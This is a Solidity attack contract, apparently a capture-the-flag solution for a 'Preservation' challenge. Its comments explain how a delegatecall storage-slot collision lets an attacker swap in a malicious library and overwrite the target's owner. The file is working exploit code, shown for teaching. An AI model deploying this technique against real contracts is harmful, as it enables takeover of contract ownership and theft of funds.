// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * Core Exploit Mechanism:
 *
 * 1. Storage slot overlap:
 *    - The library and main contract both write to slot 0.
 *    - When delegatecall is used, writes in the library affect slot 0 in the main contract.
 *
 * 2. Type coercion:
 *    - `address` (20 bytes) is cast to `uint160`, then implicitly converted to `uint256`.
 *    - The 20-byte address becomes a 32-byte value (zero-padded on the left).
 *    - This lets us pass an address as a uint256 argument without breaking the ABI.
 *
 * 3. Hijacking delegatecall:
 *    - We replace `timeZone1Library` with the attack contract using delegatecall.
 *    - Then we delegatecall again, executing the attacker's `setTime(uint256)` which
 *      writes to `owner`, giving control to the attacker.
 *
 * This exploit demonstrates the danger of:
 * - Using delegatecall without access control or immutability
 * - Assuming library storage won't interfere with the main contract
 * - Implicit type conversions masking address injections
 */
contract PreservationAttack {
    // Dummy storage layout to match Preservation contract
    // These need to match the exact order and type to ensure slot alignment
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2 - we need to get the order right for this one
    uint256 storedTime; // slot 3 - not really needed

    /**
     * @dev Malicious replacement for the library function.
     *
     * This function will be invoked via delegatecall from the Preservation contract.
     * Therefore, even though we're inside this attack contract, all state writes
     * (like to `owner`) will actually affect the storage of the caller — Preservation.
     *
     * The parameter `injectedAddress` is passed as a uint256 due to the original signature,
     * but here it's explicitly cast back to `address` using `address(uint160(...))`.
     * This is the reverse of how the address was originally injected into the delegatecall.
     *
     * Why `uint160`? Because `address` in Solidity is 20 bytes (160 bits),
     * so we must truncate the lower 160 bits of the uint256 to interpret it safely as an address.
     */
    function setTime(uint256 injectedAddress) public {
        owner = address(uint160(injectedAddress)); // ⚠️ Overwrites Preservation.owner (slot 2)
    }
}
